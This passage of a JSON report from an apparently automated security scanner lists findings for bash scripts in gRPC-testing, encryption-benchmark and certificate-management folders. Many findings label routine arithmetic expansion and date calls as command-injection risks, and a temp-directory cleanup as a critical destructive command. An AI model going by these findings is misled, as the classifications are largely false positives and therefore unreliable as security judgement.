      "issue": "Command substitution in shell",
      "evidence": "$(basename \"$0\") --server localhost:50051 --proto-file api.proto --iterations 100",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 194,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 196,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 220,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 221,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 223,
      "issue": "Command substitution in shell",
      "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 234,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 235,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 237,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 256,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 282,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 283,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 286,
      "issue": "Command substitution in shell",
      "evidence": "message_count=$(echo \"$output\" | jq -s 'length' 2>/dev/null || echo \"1\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 288,
      "issue": "Command substitution in shell",
      "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 298,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 299,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 301,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 321,
      "issue": "Command substitution in shell",
      "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 334,
      "issue": "Command substitution in shell",
      "evidence": "-H \"x-request-id:$(uuidgen 2>/dev/null || echo 'test-request-id')\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 339,
      "issue": "Command substitution in shell",
      "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 344,
      "issue": "Command substitution in shell",
      "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 372,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 380,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s.%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 381,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 383,
      "issue": "Command substitution in shell",
      "evidence": "success_count=$((success_count + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 385,
      "issue": "Command substitution in shell",
      "evidence": "error_count=$((error_count + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 389,
      "issue": "Command substitution in shell",
      "evidence": "if [ $((i % 10)) -eq 0 ]; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 406,
      "issue": "Command substitution in shell",
      "evidence": "total=$(echo \"$total + $latency\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 408,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$latency < $min\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 412,
      "issue": "Command substitution in shell",
      "evidence": "if (( $(echo \"$latency > $max\" | bc -l) )); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 417,
      "issue": "Command substitution in shell",
      "evidence": "local avg=$(echo \"scale=6; $total / ${#latencies[@]}\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 418,
      "issue": "Command substitution in shell",
      "evidence": "local rps=$(echo \"scale=2; ${#latencies[@]} / $total\" | bc)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 421,
      "issue": "Command substitution in shell",
      "evidence": "IFS=$'\\n' sorted_latencies=($(sort -n <<<\"${latencies[*]}\"))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 424,
      "issue": "Command substitution in shell",
      "evidence": "local p50_idx=$(( ${#sorted_latencies[@]} * 50 / 100 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 425,
      "issue": "Command substitution in shell",
      "evidence": "local p95_idx=$(( ${#sorted_latencies[@]} * 95 / 100 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 426,
      "issue": "Command substitution in shell",
      "evidence": "local p99_idx=$(( ${#sorted_latencies[@]} * 99 / 100 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 438,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $success_count * 100 / $iterations\" | bc)%\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 480,
      "issue": "Command substitution in shell",
      "evidence": "results_json+=\"\\\"output\\\":\\\"$(echo \"$output\" | sed 's/\"/\\\\\"/g')\\\"\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 490,
      "issue": "Command substitution in shell",
      "evidence": "\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 495,
      "issue": "Command substitution in shell",
      "evidence": "\"success_rate\": $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc 2>/dev/null || echo 0)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 513,
      "issue": "Command substitution in shell",
      "evidence": "echo \"Timestamp:   $(date)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/protocols/grpc-implementation/resources/scripts/test_grpc_server.sh",
      "line_number": 519,
      "issue": "Command substitution in shell",
      "evidence": "echo \"  Success Rate:  $(echo \"scale=2; $PASSED_TESTS * 100 / $TOTAL_TESTS\" | bc)%\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 37,
      "issue": "Command substitution in shell",
      "evidence": "TEMP_DIR=$(mktemp -d)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "CRITICAL",
      "category": "Dangerous Command",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 41,
      "issue": "Destructive file deletion",
      "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
      "recommendation": "Use safer alternatives or require explicit confirmation"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 171,
      "issue": "Command substitution in shell",
      "evidence": "elif [[ \"$(uname)\" == \"Darwin\" ]]; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 203,
      "issue": "Command substitution in shell",
      "evidence": "K|KB) echo $((number * 1024)) ;;",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 204,
      "issue": "Command substitution in shell",
      "evidence": "M|MB) echo $((number * 1024 * 1024)) ;;",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 205,
      "issue": "Command substitution in shell",
      "evidence": "G|GB) echo $((number * 1024 * 1024 * 1024)) ;;",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 218,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1073741824}\")GB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 220,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1048576}\")MB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 222,
      "issue": "Command substitution in shell",
      "evidence": "echo \"$(awk \"BEGIN {printf \\\"%.2f\\\", $bytes/1024}\")KB\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 245,
      "issue": "Command substitution in shell",
      "evidence": "dd if=/dev/urandom of=\"$input_file\" bs=1024 count=$((size_bytes / 1024)) 2>/dev/null",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 254,
      "issue": "Command substitution in shell",
      "evidence": "print_color \"$YELLOW\" \"Benchmarking $algo ($(bytes_to_human $size_bytes))...\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 258,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 261,
      "issue": "Command substitution in shell",
      "evidence": "-K \"$(xxd -p -c 256 \"$key_file\")\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 262,
      "issue": "Command substitution in shell",
      "evidence": "-iv \"$(xxd -p -c 256 \"$iv_file\")\" 2>/dev/null; then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 264,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 265,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(((end_time - start_time) / 1000000)) # Convert to milliseconds",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 267,
      "issue": "Command substitution in shell",
      "evidence": "total_time=$((total_time + duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 268,
      "issue": "Command substitution in shell",
      "evidence": "successful_runs=$((successful_runs + 1))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 286,
      "issue": "Command substitution in shell",
      "evidence": "local avg_time_ms=$((total_time / successful_runs))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 287,
      "issue": "Command substitution in shell",
      "evidence": "local avg_time_sec=$(awk \"BEGIN {printf \\\"%.3f\\\", $avg_time_ms/1000}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 288,
      "issue": "Command substitution in shell",
      "evidence": "local throughput_mbps=$(awk \"BEGIN {printf \\\"%.2f\\\", ($size_bytes / 1048576) / $avg_time_sec}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 289,
      "issue": "Command substitution in shell",
      "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1 / $avg_time_sec}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 296,
      "issue": "Command substitution in shell",
      "evidence": "\"file_size_human\": \"$(bytes_to_human $size_bytes)\",",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 327,
      "issue": "Command substitution in shell",
      "evidence": "local start_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 333,
      "issue": "Command substitution in shell",
      "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 340,
      "issue": "Command substitution in shell",
      "evidence": "echo -n \"$password\" | argon2 \"$(cat \"$salt_file\")\" -t $iterations \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 351,
      "issue": "Command substitution in shell",
      "evidence": "-kdfopt salt:\"$(xxd -p -c 256 \"$salt_file\")\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 361,
      "issue": "Command substitution in shell",
      "evidence": "local end_time=$(date +%s%N)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 362,
      "issue": "Command substitution in shell",
      "evidence": "local duration=$(((end_time - start_time) / 1000000))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 363,
      "issue": "Command substitution in shell",
      "evidence": "total_time=$((total_time + duration))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 370,
      "issue": "Command substitution in shell",
      "evidence": "local avg_time_ms=$((total_time / runs))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 371,
      "issue": "Command substitution in shell",
      "evidence": "local ops_per_sec=$(awk \"BEGIN {printf \\\"%.2f\\\", 1000 / $avg_time_ms}\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 490,
      "issue": "Command substitution in shell",
      "evidence": "local size_bytes=$(size_to_bytes \"$FILE_SIZE\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 497,
      "issue": "Command substitution in shell",
      "evidence": "echo \"File size: $(bytes_to_human $size_bytes)\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 506,
      "issue": "Command substitution in shell",
      "evidence": "if result=$(benchmark_kdf \"$kdf\" \"$kdf_iterations\"); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 507,
      "issue": "Command substitution in shell",
      "evidence": "kdf_results=$(echo \"$kdf_results\" | jq \". += [$result]\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 536,
      "issue": "Command substitution in shell",
      "evidence": "if result=$(benchmark_algorithm \"$algo\" \"$size_bytes\"); then",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 537,
      "issue": "Command substitution in shell",
      "evidence": "results=$(echo \"$results\" | jq \". += [$result]\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 540,
      "issue": "Command substitution in shell",
      "evidence": "print_color \"$GREEN\" \"\u2713 $algo: $(echo \"$result\" | jq -r .throughput_mbps) MB/s\"",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
      "line_number": 549,
      "issue": "Command substitution in shell",
      "evidence": "--arg timestamp \"$(date -u +\"%Y-%m-%dT%H:%M:%SZ\")\" \\",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/resources/hsm-integration/examples/07-disaster-recovery.sh",
      "line_number": 15,
      "issue": "Command substitution in shell",
      "evidence": "DATE_STAMP=$(date +%Y%m%d-%H%M%S)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Dangerous Command",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 224,
      "issue": "Force flag usage",
      "evidence": "--force-renewal",
      "recommendation": "Ensure user understands consequences"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 344,
      "issue": "Command substitution in shell",
      "evidence": "domain=$(basename \"$cert_dir\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 348,
      "issue": "Command substitution in shell",
      "evidence": "expiry_date=$(openssl x509 -in \"$cert_file\" -noout -enddate | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 349,
      "issue": "Command substitution in shell",
      "evidence": "expiry_epoch=$(date -d \"$expiry_date\" +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 350,
      "issue": "Command substitution in shell",
      "evidence": "now_epoch=$(date +%s)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/examples/bash/certbot-automation.sh",
      "line_number": 351,
      "issue": "Command substitution in shell",
      "evidence": "days_remaining=$(( (expiry_epoch - now_epoch) / 86400 ))",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 235,
      "issue": "Command substitution in shell",
      "evidence": "result=$(printf '{\"host\":\"%s\",\"port\":%d,\"status\":\"error\",\"error\":\"Connection failed\"}' \"$host\" \"$port\")",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 242,
      "issue": "Command substitution in shell",
      "evidence": "not_before=$(echo \"$cert_info\" | grep \"notBefore=\" | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/cryptography/certificate-management/resources/scripts/monitor_cert_expiry.sh",
      "line_number": 243,
      "issue": "Command substitution in shell",
      "evidence": "not_after=$(echo \"$cert_info\" | grep \"notAfter=\" | cut -d= -f2)",
      "recommendation": "Validate and sanitize all inputs"
    },
